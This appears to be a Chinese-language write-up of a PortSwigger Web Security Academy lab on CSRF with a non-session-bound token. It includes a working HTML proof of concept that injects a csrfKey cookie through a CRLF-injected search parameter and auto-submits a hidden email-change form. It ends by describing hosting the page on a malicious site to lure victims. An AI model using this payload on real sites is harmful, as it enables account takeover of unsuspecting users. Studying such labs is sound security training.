

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/csrf/images/3B804C823B164AC3A4B104B091D074AAclipboard.png)

将用户一的csrfkey和csrf用用户二的替换，还可以执行更改密码操作，说明存在csrf



执行搜索时发现输入的搜索值会包含到响应头里，可以尝试cookie注入

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/csrf/images/F04D28EEE032403CB7E7248E15F28253clipboard.png)





利用脚本：

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac7c1f0a1e8ad4e880c62ed200870076.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="123&#64;qq&#46;com" />
      <input type="hidden" name="csrf" value="nGrpG4PjPWlzPrghnZsFEAmytn7lmmz5" />
      <input type="submit" value="Submit request" />
    </form>
    //自动访问src，执行cookie注入
<img src="https://ac7c1f0a1e8ad4e880c62ed200870076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=LZJbJ7KOYDPeUD9JWQqmAH8QA3Dd1bNq" onerror="document.forms[0].submit()">
  </body>
</html>

```



将脚本部署到恶意网站上，诱使用户点击即可更改用户email